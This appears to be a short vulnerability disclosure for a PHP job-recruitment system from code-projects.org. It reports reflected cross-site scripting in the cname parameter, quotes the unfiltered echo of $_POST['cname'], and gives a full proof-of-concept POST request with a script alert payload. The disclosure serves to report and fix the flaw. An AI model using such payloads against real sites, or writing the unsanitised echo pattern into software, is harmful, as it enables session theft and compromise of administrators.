# job-recruitment-in-php has Cross Site Scripting vulnerability in cname parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
cname  parameter

## describe

In  cname  parameter, There is a cross-site scripting attack  vulnerability in Job-recruitment system. The parameter that can be controlled is: cname  parameter . A malicious attacker can obtain sensitive information about administrators.

**Code analysis** 

echo $_POST['cname'];

get cname parameter from post, and echo cname in no filtter.

![image-20241226013913817](https://github.com/user-attachments/assets/4a09d565-c48d-4e61-9279-d10b91d4dc02)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=cn_update&cname=<script>alert(1);</script>&url=1*
```

**Result**

![image-20241226014042311](https://github.com/user-attachments/assets/4e99c0fa-aee2-4ae1-84ed-8e5c1c82cd42)